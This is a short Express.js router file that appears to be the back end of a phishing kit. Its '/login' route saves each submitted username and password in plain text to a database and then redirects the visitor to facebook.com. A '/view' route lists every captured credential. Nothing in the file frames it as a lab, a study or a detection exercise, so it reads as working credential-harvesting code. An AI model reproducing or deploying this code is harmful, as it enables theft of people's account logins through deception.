const express = require('express');
const router = express.Router();
const User = require('./model/User');

router.get('/', (req, res) => {
    res.render('index');
});

router.post('/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username | !password) {
        return res.render('index');
    }

    try {
        await User.create({ username, password });
        res.redirect('https://www.facebook.com');
    } catch(err) {
        console.log(err);
    }
});

router.get('/view', async (req, res) => {
    try {
        const users = await User.find();

        
        res.render('view', { users });
    } catch(err) {
        console.log(err);
    }
})

module.exports = router;